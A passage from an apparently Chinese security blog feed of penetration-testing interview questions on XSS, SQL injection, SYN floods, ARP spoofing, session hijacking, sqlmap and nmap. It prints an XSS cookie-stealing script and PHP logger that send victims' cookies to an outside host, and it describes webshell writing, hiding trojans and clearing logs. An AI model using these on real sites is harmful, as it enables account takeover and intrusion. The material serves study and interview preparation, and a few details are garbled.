<p>对称加密：加解密用同一密钥，密钥维护复杂 n（n-1）/2，不适合互联网传输密钥，加解密效率高。应用于加密数据。非对称加密：公钥推不出私钥，每个用户一个非对称密钥对就可以，适合于互联网传输公钥，但是加密效率低，应用于数字签名及加密。</p>
<p><strong>14.什么是同源策略？</strong></p>
<p>为了防止不同域在用户浏览器中彼此干扰，浏览器对从不同来源（域）收到的内容进行隔离。浏览器不允许任何旧有脚本访问一个站点的 cookie，否则 ，会话容易被劫持。只有发布 cookie 的站点能够访问这些 cookie，只有通过该站点返回的页面所包含或加载的 JavaScript 才能访问 cookie。协议相同，域名相同，端口相同</p>
<p><strong>15.cookie 存在哪里？可以打开吗?</strong></p>
<p>C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Cookies</p>
<p>工具–文件夹选项–查看–将隐藏被保护的文件的对勾去掉就会看到 cookies 文件夹。</p>
<p><strong>16.xss 如何盗取 cookie？</strong></p>
<p>攻击者代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cookie=$_GET[&apos;cookie&apos;];</span><br><span class="line"></span><br><span class="line">$time=date(&apos;Y-m-d g:i:s&apos;);</span><br><span class="line"></span><br><span class="line">$referer=getenv(&apos;HTTP_REFERER&apos;);</span><br><span class="line"></span><br><span class="line">$cookietxt=fopen(&apos;cookie.txt&apos;,&apos;a&apos;);</span><br><span class="line"></span><br><span class="line">fwrite($cookietxt,&quot;time:&quot;.$time.&quot; cookie:&quot;.$cookie.&quot; referer:&quot;.$referer.&quot;&quot;); </span><br><span class="line"></span><br><span class="line">fclose($cookietxt);?&gt;</span><br></pre></td></tr></table></figure>

<p>脚本端：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">document.write(&apos;&lt;img </span><br><span class="line"></span><br><span class="line">src=&quot;http://ip/cookie.php?cookie=&apos;+document.cookie+&apos;&quot; width=0 height=0 border=0 /&gt;&apos;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>获取到 cookie 后，用 firebug 找到 cookie，新建 cookie</p>
<p>加入 cookie，用 referer 来提交，无需输入帐号密码直接登录进去！</p>
<p><strong>17.tcp、udp 的区别及 tcp 三次握手，syn 攻击？</strong></p>
<p>也可参考<a href="http://www.cnblogs.com/bizhu/archive/2012/05/12/2497493.html" target="_blank" rel="noopener">http://www.cnblogs.com/bizhu/archive/2012/05/12/2497493.html</a></p>
<p>（1）tcp、udp 区别</p>
<p>TCP 的优点：</p>
<p>可靠，稳定</p>
<p>TCP 的可靠体现在 TCP 在传递数据之前，会有三次握手来建立连接，而且在数据传递时，有确认、窗口、重传、拥塞控制机制，在数据传完后，还会断开连接用来节约系统资源。</p>
<p>TCP 的缺点：</p>
<p>慢，效率低，占用系统资源高，易被攻击</p>
<p>TCP 在传递数据之前，要先建连接，这会消耗时间，而且在数据传递时，确认机制、重传机制、拥塞控制机制等都会消耗大量的时间，而且要在每台设备上维护所有的传输连接，事实上，每个连接都会占用系统的 CPU、内存等硬件资源。而且，因为 TCP 有确认机制、三次握手机制，这些也导致 TCP 容易被人利用，实现 DOS、DDOS、CC 等攻击。</p>
<p>UDP 的优点：</p>
<p>快，比 TCP 稍安全</p>
<p>UDP 没有 TCP 的握手、确认、窗口、重传、拥塞控制等机制，UDP 是一个无状态的传输协议，所以它在传递数据时非常快。没有 TCP 的这些机制，UDP 较 TCP被攻击者利用的漏洞就要少一些。但 UDP 也是无法避免攻击的，比如：UDP Flood 攻击……</p>
<p>UDP 的缺点：</p>
<p>不可靠，不稳定</p>
<p>因为 UDP 没有 TCP 那些可靠的机制，在数据传递时，如果网络质量不好，就会很容易丢包。基于上面的优缺点，那么：</p>
<p>什么时候应该使用 TCP：当对网络通讯质量有要求的时候，比如：整个数据要准确无误的传递给对方，这往往用于一些要求可靠的应用，比如 HTTP、HTTPS、FTP 等传输文件的协议，POP、SMTP 等邮件传输的协议。</p>
<p>在日常生活中，常见使用 TCP 协议的应用如下：浏览器，用的 HTTPFlashFXP，用的 FTP Outlook，用的 POP、SMTP Putty，用的 Telnet、SSH QQ 文件传输</p>
<p>什么时候应该使用 UDP：</p>
<p>当对网络通讯质量要求不高的时候，要求网络通讯速度能尽量的快，这时就可以使用 UDP。比如，日常生活中，常见使用 UDP 协议的应用如下：QQ 语音 QQ 视频 TFTP</p>
<p>（2）TCP 握手协议</p>
<p>在 TCP/IP 协议中，TCP 协议提供可靠的连接服务，采用三次握手建立一个连接。</p>
<p>第一次握手：建立连接时，客户端发送 syn 包(syn=j)到服务器，并进入SYN_SEND 状态，等待服务器确认；</p>
<p>第二次握手：服务器收到 syn 包，必须确认客户的 SYN（ack=j+1），同时自己也发送一个 SYN 包（syn=k），即 SYN+ACK 包，此时服务器进入 SYN_RECV 状态；</p>
<p>第三次握手：客户端收到服务器的 SYN+ACK 包，向服务器发送确认包</p>
<p>ACK(ack=k+1)，此包发送完毕，客户端和服务器进入 ESTABLISHED 状态，完成三次握手。完成三次握手，客户端与服务器开始传送数据，在上述过程中，还有一些重要的</p>
<p>概念：</p>
<p>未连接队列：在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的 SYN 包（syn=j）开设一个条目，该条目表明服务器已收到 SYN 包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于 Syn_RECV 状态，当服务器收到客户的确认包时，删除该条目，服务器进入 ESTABLISHED 状态。</p>
<p>backlog 参数：表示未连接队列的最大容纳数目。</p>
<p>SYN-ACK 重传次数 服务器发送完 SYN－ACK 包，如果未收到客户确认包，服务器进行首次重传，等待一段时间仍未收到客户确认包，进行第二次重传，如果重传次数超过系统规定的最大重传次数，系统将该连接信息从半连接队列中删除。注意，每次重传等待的时间不一定相同。</p>
<p>半连接存活时间：是指半连接队列的条目存活的最长时间，也即服务从收到 SYN包到确认这个报文无效的最长时间，该时间值是所有重传请求包的最长等待时间总和。有时我们也称半连接存活时间为 Timeout 时间、SYN_RECV 存活时间。</p>
<p>（3）SYN 攻击原理</p>
<p>SYN 攻击属于 DOS 攻击的一种，它利用 TCP 协议缺陷，通过发送大量的半连接请求，耗费 CPU 和内存资源。</p>
<p>SYN 攻击除了能影响主机外，还可以危害路由器、防火墙等网络系统，事实上SYN 攻击并不管目标是什么系统，只要这些系统打开 TCP 服务就可以实施。从上图可看到，服务器接收到连接请求（syn=j），将此信息加入未连接队列，并发送请求包给客户（syn=k,ack=j+1），此时进入SYN_RECV 状态。当服务器未收到客户端的确认包时，重发请求包，一直到超时，才将此条目从未连接队列删除。</p>
<p>配合 IP 欺骗，SYN 攻击能达到很好的效果，通常，客户端在短时间内伪造大量不存在的 IP 地址，向服务器不断地发送 syn 包，服务器回复确认包，并等待客户的确认，由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的 SYN 包将长时间占用未连接队列，正常的 SYN 请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。</p>
<p><strong>18.证书要考哪些？</strong></p>
<p>信息安全国际第一认证——CISSP</p>
<p>信息安全国内认证——CISAW</p>
<p>信息安全国内认证——CISP</p>
<p>信息安全技术实操认证新贵——Security+</p>
<p>IT 审计人员的必备之证——CISA= </p>
<p><strong>19.DVWA 是如何搭建的？</strong></p>
<p>下载源码配数据库install或者docker</p>
<p><strong>20.渗透测试的流程是什么？</strong></p>
<p>渗透测试流程概述</p>
<p>前期交互阶段、情报搜集阶段、威胁建模阶段、漏洞分析阶段、渗透攻击阶段（Exploitation）、后渗透攻击阶段（怎么一直控制，维持访问）、报告阶段。</p>
<p>攻击前：网络踩点、网络扫描、网络查点</p>
<p>攻击中：利用漏洞信息进行渗透攻击、获取权限</p>
<p>攻击后：后渗透维持攻击、文件拷贝、木马植入、痕迹擦除</p>
<p><strong>21.xss 如何防御？</strong></p>
<p>1.对前端输入做过滤和编码：比如只允许输入指定类型的字符，比如电话号格式，注册用户名限制等，输入检查需要在服务器端完成，在前端完成的限制是容易绕过的；对特殊字符进行过滤和转义；</p>
<p>2.对输出做过滤和编码：在变量值输出到前端的 HTML 时进行编码和转义；3.给关键 cookie 使用 http-only</p>
<p><strong>22.IIS 服务器应该做哪些方面的保护措施？</strong></p>
<p>整理来源：<a href="http://www.williamlong.info/archives/118.html" target="_blank" rel="noopener">http://www.williamlong.info/archives/118.html</a></p>
<ol>
<li>保持 Windows 升级:</li>
<li>使用 IIS 防范工具</li>
<li>移除缺省的 Web 站点</li>
<li>如果你并不需要 FTP 和 SMTP 服务，请卸载它们</li>
<li>有规则地检查你的管理员组和服务:</li>
<li>严格控制服务器的写访问权限</li>
<li>设置复杂的密码</li>
<li>减少/排除 Web 服务器上的共享</li>
<li>禁用 TCP/IP 协议中的 NetBIOS:</li>
<li>使用 TCP 端口阻塞</li>
<li>仔细检查<em>.bat 和</em>.exe 文件: 每周搜索一次*.bat</li>
<li>管理 IIS 目录安全:</li>
<li>使用 NTFS 安全:</li>
<li>管理用户账户</li>
<li>审计你的 Web 服务器: </li>
</ol>
<p><strong>23.什么叫 CC 攻击？</strong></p>
<p>攻击者借助代理服务器生成指向受害主机的合法请求，实现 DDOS,和伪装就叫：CC(ChallengeCollapsar)。CC 主要是用来攻击页面的。大家都有这样的经历，就是在访问论坛时，如果这个论坛比较大，访问的人比较多，打开页面的速度会比较慢，访问的人越多，论坛的页面越多，数据库就越大，被访问的频率也越高，占用的系统资源也就相当可观。</p>
<p>一个静态页面不需要服务器多少资源，甚至可以说直接从内存中读出来发给你就可以了，但是论坛就不一样了，我看一个帖子，系统需要到数据库中判断我是否有读帖子的权限，如果有，就读出帖子里面的内容，显示出来——这里至少访问了 2 次数据库，如果数据库的数据容量有 200MB 大小，系统很可能就要在这200MB 大小的数据空间搜索一遍，这需要多少的 CPU 资源和时间？如果我是查找一个关键字，那么时间更加可观，因为前面的搜索可以限定在一个很小的范围内，比如用户权限只查用户表，帖子内容只查帖子表，而且查到就可以马上停止查询，而搜索肯定会对所有的数据进行一次判断，消耗的时间是相当的大。CC 就是充分利用了这个特点，模拟多个用户（多少线程就是多少用户）不停的进行访问（访问那些需要大量数据操作，就是需要大量 CPU 时间的页面）.这一点用一个一般的性能测试软件就可以做到大量模拟用户并发。</p>
<p><strong>24.虚拟机的几种连接方式及原理？</strong></p>
<p>整理来源：<a href="http://blog.csdn.net/shuxiao9058/article/details/7051463" target="_blank" rel="noopener">http://blog.csdn.net/shuxiao9058/article/details/7051463</a></p>
<p>安装完虚拟机后，默认安装了两个虚拟网卡，VMnet1 和 VMnet8，其他的未安装（当然也可以手动安装其他的）。其中 VMnet1 是 host 网卡，用于 host 方式连接网络的。VMnet8 是 NAT 网卡，用于 NAT 方式连接网络的。它们的 IP 地址是随机生成的，如果要用虚拟机做实验的话，最好将 VMnet1 到 VMnet8 的 IP 地址改掉。习惯上把 VMware 虚拟网卡使用的网段”固定”，使用如下原则：VMnet1 对应的网段是 192.168.10.0，VMnet2 对应的网段是 192.168.20.0，其他的类似。当然平常只是随便用用的就不用改了，能上网就行了。</p>
<p>VMware 网络连接的方式主要有：桥接（Bridged）、NAT、主机网络（Host-Only）。</p>
<ol>
<li>Use bridged networking（使用桥接网络）</li>
</ol>
<p>说明：使用 VMnet0 虚拟交换机，此时虚拟机相当与网络上的一台独立计算机与主机一样，拥有一个独立的 IP 地址，其网络拓扑如图 1 所示，使用桥接方式，A，A1，A2，B 可互访。</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/VMware1.png" alt="html">    </p>
<ol start="2">
<li>Use network address translation（NAT）</li>
</ol>
<p>说明：使用 Vmnet8 虚拟交换机，此时虚拟机可以通过主机单向网络上的其他工作站，其他工作站不能访问虚拟机。其网络拓扑如图 2 所示，使用 NAT 方式，A1，A2 可以访问 B，但 B 不可以访问 A1，A2。但 A，A1，A2 可以互访。</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/VMware2.png" alt="html">    </p>
<ol start="3">
<li>Use Host-Only networking（使用主机网络）</li>
</ol>
<p>说明：使用 Vmnet1 虚拟交换机，此时虚拟机只能与虚拟机、主机互访。也就是不能上 Internet，其网络拓扑如图 3 所示，使用 Host 方式，A，A1，A2 可以互访，但 A1，A2 不能访问 B，也不能被 B访问。</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/VMware3.png" alt="html">    </p>
<p><strong>25.xss 有 cookie 一定可以无用户名密码登录吗？</strong></p>
<p>基本可以。因为把 cookie 的值给浏览器，浏览器去访问页面会用已有的 cookie去访问，如果 cookie 有效，就会直接进去。</p>
<p><strong>26.SSL Strip(SSp)攻击到底是什么？</strong></p>
<p>SSL 协议(Secure Socket Layer，安全套接层)主要是使用公开密钥体制和 X.509数字证书技术保护信息传输的机密性和完整性，它不能保证信息的不可抵赖性，主要适用于点对点之间的信息传输，常用 Web Server 方式。</p>
<p>详细解释 <a href="http://hover.blog.51cto.com/258348/218841" target="_blank" rel="noopener">http://hover.blog.51cto.com/258348/218841</a></p>
<p><strong>27.中间人攻击——ARP 欺骗的原理、实战及防御？</strong></p>
<p>(1）什么是网关</p>
<p>首先来简单解释一下什么是网关，网关工作在 OSI 七层模型中的传输层或者应用层，用于高层协议的不同网络之间的连接，简单地说，网关就好比是一个房间通向另一个房间的一扇门。</p>
<p>（2）ARP 协议是什么</p>
<p>ARP（Address Resolution Protocol）地址转换协议，工作在 OSI 模型的数据链路层，在以太网中，网络设备之间互相通信是用 MAC 地址而不是 IP 地址，ARP 协议就是用来把 IP 地址转换为 MAC 地址的。而 RARP 和 ARP 相反，它是反向地址转换协议，把 MAC 地址转换为 IP 地址。</p>
<p>假设 A(192.168.1.2)与 B(192.168.1.3)在同一局域网，A 要和 B 实现通信。A 首先会发送一个数据包到广播地址(192.168.1.255)，该数据包中包含了源 IP（A）、源 MAC、目的 IP（B）、目的 MAC，这个数据包会被发放给局域网中所有的主机，但是只有 B 主机会回复一个包含了源 IP（B）、源 MAC、目的 IP（A）、目的 MAC 的数据包给 A，同时 A 主机会将返回的这个地址保存在 ARP 缓存表中。</p>
<p>（3）ARP 欺骗原理</p>
<p>上面提到过了 ARP 缓存表，在每台主机都有一个 ARP 缓存表，缓存表中记录了IP 地址与 MAC 地址的对应关系，而局域网数据传输依靠的是 MAC 地址。假设主机 A 192.168.1.2,B 192.168.1.3,C 192.168.1.4; 网关 G 192.168.1.1; 在同一局域网，主机 A 和 B 通过网关 G 相互通信，就好比 A 和 B 两个人写信，由邮递员 G 送信，C 永远都不会知道 A 和 B 之间说了些什么话。但是并不是想象中的那么安全，在 ARP 缓存表机制存在一个缺陷，就是当请求主机收到 ARP应答包后，不会去验证自己是否向对方主机发送过 ARP 请求包，就直接把这个返回包中的 IP 地址与 MAC 地址的对应关系保存进 ARP 缓存表中，如果原有相同 IP 对应关系，原有的则会被替换。这样 C 就有了偷听 A 和 B 的谈话的可能，继续思考上面的例子：C 假扮邮递员，首先要告诉 A 说：“我就是邮递员” （C 主机向 A 发送构造好的返回包，源 IP 为 G 192.168.1.1，源 MAC 为 C 自己的 MAC 地址），愚蠢的A 很轻易的相信了，直接把“C 是邮递员”这个信息记在了脑子里；C 再假扮 A，告诉邮递员：“我就是 A” （C 向网关 G 发送构造好的返回包，源 IP 为 A 192.168.1.2，源 MAC 地址为自己的 MAC 地址），智商捉急的邮递员想都没想就相信了，以后就把 B 的来信送给了 C，C 当然就可以知道 A 和 B之间聊了些什么上面 ABCG 的故事就是 ARP 双向欺骗的原理了</p>
<p>ARP 单向欺骗就更好理解了，C 只向 A 发送一个返回包，告诉 A：G 192.168.1.1 的 MAC 地址为 5c-63-bf-79-1d-fa（一个错误的 mac 地址），A 把这个信息记录在了缓存表中，而 G 的缓存表不变，也就是说，A 把数据包给了 C，而 G的包还是给 A，这样就是 ARP 单向欺骗了。</p>
<p><strong>28.会话劫持原理?</strong></p>
<p>在现实生活中，比如你去市场买菜，在交完钱后你要求先去干一些别的事情，稍候再来拿菜；如果这个时候某个陌生人要求把菜拿走，卖菜的人会把菜给陌生人吗？！当然，这只是一个比喻，但这恰恰就是会话劫持的喻意。所谓会话，就是两台主机之间的一次通讯。例如你 Telnet 到某台主机，这就是一次 Telnet 会话；你浏览某个网站，这就是一次 HTTP 会话。而会话劫持（Session Hijack），就是结合了嗅探以及欺骗技术在内的攻击手段。例如，在一次正常的会话过程当中，攻击者作为第三方参与到其中，他可以在正常数据包中插入恶意数据，也可以在双方的会话当中进行简听，甚至可以是代替某一方主机接管会话。我们可以把会话劫持攻击分为两种类型：</p>
<p>1）中间人攻击(Man In The Middle，简称 MITM)， </p>
<p>2）注射式攻击（Injection）；并且还可以把会话劫持攻击分为两种形式：</p>
<p>1.被动劫持 2.主动劫持</p>
<p>被动劫持实际上就是在后台监视双方会话的数据流，丛中获得敏感数据；而主动劫持则是将会话当中的某一台主机“踢”下线，然后由攻击者取代并接管会话，这种攻击方法危害非常大，攻击者可以做很多事情，比如“cat etc/master.passwd”（FreeBSD 下的 Shadow 文件）。图 1 为会话劫持示意图。</p>
<p><strong>29.MITM 攻击简介？</strong></p>
<p>这也就是我们常说的“中间人攻击”，在网上讨论比较多的就是 SMB 会话劫持，这也是一个典型的中间人攻击。要想正确的实施中间人攻击，攻击者首先需要使用 ARP 欺骗或 DNS 欺骗，将会话双方的通讯流暗中改变，而这种改变对于会话双方来说是完全透明的。关于 ARP 欺骗黑客防线介绍的比较多，网上的资料也比较多，我就不在多说了，我只简单谈谈 DNS 欺骗。DNS（Domain Name System），即域名服务器，我们几乎天天都要用到。对于正常的 DNS 请求，例如在浏览器输入 <a href="http://www.hacker.com.cn，然后系统先查看" target="_blank" rel="noopener">www.hacker.com.cn，然后系统先查看</a> Hosts 文件，如果有相对应的 IP，就使用这个 IP 地址访问网站（其实，利用 Hosts 文件就可以实现DNS 欺骗）；如果没有，才去请求 DNS 服务器；DNS 服务器在接收到请求之后，解析出其对应的 IP 地址，返回给我本地，最后你就可以登陆到黑客防线的网站。而 DNS 欺骗则是，目标将其 DNS 请求发送到攻击者这里，然后攻击者伪造 DNS 响应，将正确的 IP 地址替换为其他 IP，之后你就登陆了这个攻击者指定的 IP，而攻击者早就在这个 IP 中安排好了恶意网页，可你却在不知不觉中已经被攻击者下了“套”……DNS 欺骗也可以在广域网中进行，比较常见的有“Web 服务器重定向”、“邮件服务器重定向”等等。但不管是 ARP 欺骗，还是 DNS 欺骗，中间人攻击都改变正常的通讯流，它就相当于会话双方之间的一个透明代理，可以得到一切想知道的信息，甚至是利用一些有缺陷的加密协议来实现。</p>
<p><strong>30.注射式攻击简介？</strong></p>
<p>这种方式的会话劫持比中间人攻击实现起来简单一些，它不会改变会话双方的通讯流，而是在双方正常的通讯流插入恶意数据。在注射式攻击中，需要实现两种技术：1）IP 欺骗，2）预测 TCP 序列号。如果是 UDP 协议，只需伪造 IP 地址，然后发送过去就可以了，因为 UDP 没有所谓的 TCP 三次握手，但基于 UDP 的应用协议有流控机制，所以也要做一些额外的工作。对于 IP 欺骗，有两种情况需要用到：1）隐藏自己的 IP 地址；2）利用两台机器之间的信任关系实施入侵。在 Unix/Linux 平台上，可以直接使用 Socket 构造 IP 包，在 IP 头中填上虚假的IP 地址，但需要 root 权限；在 Windows 平台上，不能使用 Winsock，需要使用 Winpacp（也可以使用 Libnet）。例如在 Linux 系统，首先打开一个RawSocket（原始套接字），然后自己编写 IP 头及其他数据。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试面试总结(二)</title>
    <url>/2019/12/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E8%AF%95%E9%A2%98(%E4%BA%8C)/</url>
    <content><![CDATA[<p>关于面试的一些总结。</p>
<a id="more"></a>

<p><strong>1.在windows 2013 服务器中建立一个<code>.zhongzi</code>文件夹的意义是什么</strong></p>
<p>隐藏文件夹 不让管理员发现上传的木马或者软件</p>
<p><strong>2.sql注入有以下两个测试选项，选择一个并且阐述不选择另一个的理由</strong> </p>
<p>A：demo.jsp?id=2+1  B：demo.jsp?id=2-1</p>
<p>选择B 因为在URL编码中+代表着连接符可能会混淆</p>
<p><strong>3.以下链接存在sql注入漏洞，对于这个变形注入，你有什么思路?</strong></p>
<p><code>demm.do?DATA=AjAxNg==</code> DATA有可能经过了base64编码所以我们在bypass的时候要对自己的payload进行base64编码</p>
<p><strong>4.<code>demo.jsp?uid=110</code>注入点，你有哪几种思路获取webshell 哪种是优选 ？</strong></p>
<p>1.有写入权限，构造联合查询语句使用 <code>using INTO OUTFIELE</code>，可以将查询的输出重定向到系统的文件中，这样去写webshell </p>
<p>2.使用sqlmap-os–shell原理和上面的一种相同，来直接获得一个shell，这样效率更高。</p>
<p>3.通过构造联合查询语句得到网站管理员的账户密码，然后扫后台，登陆后台后通过上传一些手段获取webshell。</p>
<p><strong>5.CSRF和XSS XXE有什么区别，以及修复方式</strong></p>
<p>1.xss是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息的攻击。</p>
<p>修复方式: 对字符实体进行转义，使用HTTP Only来禁止javascript来读取Cookie的值，输入时校验，浏览器与Ｗｅｂ应用端采取相同的编码格式。</p>
<p>２.csrf跨站请求伪造攻击。xss是实现csrf的诸多手段的一种，是由于没有在关键操作执行的时候没有判断是不是用户自愿进行的操作。</p>
<p>修复方式：筛选出需要防范的CSRF的页面然后嵌入Token，再次输入密码，检验Referer</p>
<p>3.XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程的内容，和远程文件保护类似。会引发相关的安全问题，例如敏感文件读取。</p>
<p>修复方式:XML解析库在调用时严格禁止对外部实体的解析</p>
<p><strong>6.CSRF，SSRF和重放攻击有什么区别？</strong></p>
<p>CSRF是由客户端发起 SSRF是服务器发起 重放攻击是将截获的数据包进行重放攻击，达到身份认证的目的。</p>
<p><strong>7.至少说出三种业务逻辑漏洞，以及修复方式</strong></p>
<p>1.密码找回漏洞中存在密码允许暴力破解，存在通用型找回凭证，可以跳过验证步骤，找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码</p>
<p>2.身份认证漏洞中最常见的是会话固定攻击和Cookie仿冒只要得到Session或者Cookie即可伪造用户身份</p>
<p>3.验证码漏洞中存在验证码允许暴力破解，验证码可以通过js或者改包的方式进行绕过。</p>
<p><strong>8.圈出下面会话中可能存在问题的项，并标注可能会存在的问题？</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /ecskins/demo.jsp?uid=2016031900&amp;keyword=”hello world!” </span><br><span class="line">HTTP/1.1</span><br><span class="line">Host: ***com:82</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) </span><br><span class="line">Gecko/20100101 Firefox/45.0</span><br><span class="line">Accept: text/css,/;q=0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://*******com:82/eciop/orderForCC/cgtListForCC.htm?zone</span><br><span class="line">=11370601&amp;v=1459663591817</span><br><span class="line">Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d; </span><br><span class="line">uniqueuserid=session_0GRMiFiYJhAh5_HZrQoZamJ; </span><br><span class="line">st_uid=N90pIYHLZgjXI-NX01vPUf46w952J-0NcX19vgj1L%3DJXrZP9sf0I</span><br><span class="line">Y-vEI9iNIX150iLXKat1YZLnUf46Z%2C5aec5biM5rCROueDn%2BWPsOeD</span><br><span class="line">n%2BiNiTrng5%2Flj7A%3D; status=True</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>

<p>标红 1：sql 注入，标红 2：xss，标红 3：cookies 欺骗，4：会话 CSRF 或重放风险。考对 HTTP 数据包字段敏感度及会话渗透经验。</p>
<p><strong>9.找一类你最擅长的漏洞，谈下绕过漏洞修复后的方案？</strong></p>
<p><strong>10.你常用的渗透工具有哪些，最常用的是哪个？</strong></p>
<p>burpsuit,appscan,avwvs,sqlmap,fiddler 等</p>
<p><strong>11.描述一个你深入研究过的 CVE 或 POC?</strong> </p>
<p>如 cve-2017-11191 offcie 的 dde 漏洞</p>
<p><strong>12.谈谈你经常关注的安全平台？</strong></p>
<p>如，tools.net,90sec,先知社区，安全客，freebuf 等</p>
<p><strong>13.给你一个网站你是如何来渗透测试的?</strong></p>
<p>在获取书面授权的前提下：</p>
<p>(1)信息收集，</p>
<p>1.获取域名的 whois 信息,获取注册者邮箱姓名电话等。</p>
<p>2.查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的 cms 或者其他漏洞。</p>
<p>3.查看服务器操作系统版本，web 中间件，看看是否存在已知的漏洞，比如 IIS，APACHE,NGINX 的解析漏洞</p>
<p>4.查看 IP，进行 IP 地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh 弱口令等。</p>
<p>5.扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php 探针</p>
<p>6.google hack 进一步探测网站的信息，后台，敏感文件</p>
<p>(2)漏洞扫描</p>
<p>开始检测漏洞，如 XSS,XSRF,sql 注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</p>
<p>(3)漏洞利用</p>
<p>利用以上的方式拿到 webshell，或者其他权限</p>
<p>(4)权限提升</p>
<p>提权服务器，比如 windows 下 mysql 的 udf 提权，serv-u 提权，windows低版本的漏洞，如 iis6,pr,巴西烤肉，linux 脏牛漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以及 oracle 低权限提权</p>
<p>(5)日志清理</p>
<p>(6)总结报告及修复方案</p>
<p>或者：</p>
<p>1）信息收集</p>
<p>a. 服务器的相关信息（真实 ip，系统类型，版本，开放端口，WAF 等）</p>
<p>b. 网站指纹识别（包括，cms，cdn，证书等），dns 记录</p>
<p>c. whois 信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</p>
<p>d. 子域名收集，旁站查询(有授权可渗透)，C 段等</p>
<p>e. google hacking 针对化搜索，pdf 文件，中间件版本，弱口令扫描等f. 扫描网站目录结构，爆后台，网站 banner，测试文件，备份等敏感文件泄漏</p>
<p>等</p>
<p>i. 传输协议，通用漏洞，exp，github 源码等</p>
<p>2）漏洞挖掘</p>
<p>1&gt; 浏览网站，看看网站规模，功能，特点等</p>
<p>2&gt; 端口，弱口令，目录等扫描</p>
<p>3&gt; XSS，SQL 注入，命令注入，CSRF，cookie 安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</p>
<p>3）漏洞利用 | 权限提升</p>
<p>a) mysql 提权，serv-u 提权，linux 内核版本提权等</p>
<p>4）清除测试数据 | 输出报告</p>
<p>i 日志、测试数据的清理</p>
<p>ii 总结，输出渗透测试报告，附修复方案</p>
<p>5) 复测</p>
<p>验证并发现是否有新漏洞，输出报告，归档</p>
<p><strong>14.sqlmap，怎么对一个注入点注入？</strong></p>
<p>(1)如果是 get 型号，直接，sqlmap -u “诸如点网址”.(2)如果是 post 型诸如点，可以 sqlmap -u “注入点网址” –data=”post</p>
<p>的参数”</p>
<p>(3)如果是 cookie，X-Forwarded-For 等，可以访问的时候，用 burpsuite抓包，注入处用*号替换，放到文件里，然后 sqlmap -r “文件地址”</p>
<p><strong>15.nmap，扫描的几种方式?</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一种：Intense scan</span><br><span class="line"></span><br><span class="line">(nmap -T4 -A -v)</span><br><span class="line"></span><br><span class="line">一般来说，Intense scan可以满足一般扫描</span><br><span class="line"></span><br><span class="line">-T4 加快执行速度</span><br><span class="line"></span><br><span class="line">-A 操作系统及版本探测</span><br><span class="line"></span><br><span class="line">-v 显示详细的输出</span><br><span class="line"></span><br><span class="line">第二种：Intense scan plus UDP</span><br><span class="line"></span><br><span class="line">(nmap -sS -sU -T4 -A -v)</span><br><span class="line"></span><br><span class="line">即UDP扫描</span><br><span class="line"></span><br><span class="line">-sS  TCP SYN 扫描</span><br><span class="line"></span><br><span class="line">-sU  UDP 扫描</span><br><span class="line"></span><br><span class="line">第三种：Intense scan,all TCP ports</span><br><span class="line"></span><br><span class="line">(nmap -p 1-65536 -T4 -A -v)</span><br><span class="line"></span><br><span class="line">扫描所有TCP端口，范围在1-65535，试图扫描所有端口的开放情况，速度比较慢。</span><br><span class="line"></span><br><span class="line">-p 指定端口扫描范围</span><br><span class="line"></span><br><span class="line">第四种：Intense scan,no ping</span><br><span class="line"></span><br><span class="line">(nmap -T4 -A -v -Pn)</span><br><span class="line"></span><br><span class="line">非ping扫描</span><br><span class="line"></span><br><span class="line">-Pn 非ping扫描</span><br><span class="line"></span><br><span class="line">第五种：Ping scan</span><br><span class="line"></span><br><span class="line">(nmap -sn)</span><br><span class="line"></span><br><span class="line">Ping 扫描</span><br><span class="line"></span><br><span class="line">优点：速度快。</span><br><span class="line"></span><br><span class="line">缺点：容易被防火墙屏蔽，导致无扫描结果</span><br><span class="line"></span><br><span class="line">-sn ping扫描</span><br><span class="line"></span><br><span class="line">第六种：Quick scan</span><br><span class="line"></span><br><span class="line">(nmap -T4 -F)</span><br><span class="line"></span><br><span class="line">快速的扫描</span><br><span class="line"></span><br><span class="line">-F 快速模式。</span><br><span class="line"></span><br><span class="line">第七种：Quick scan plus</span><br><span 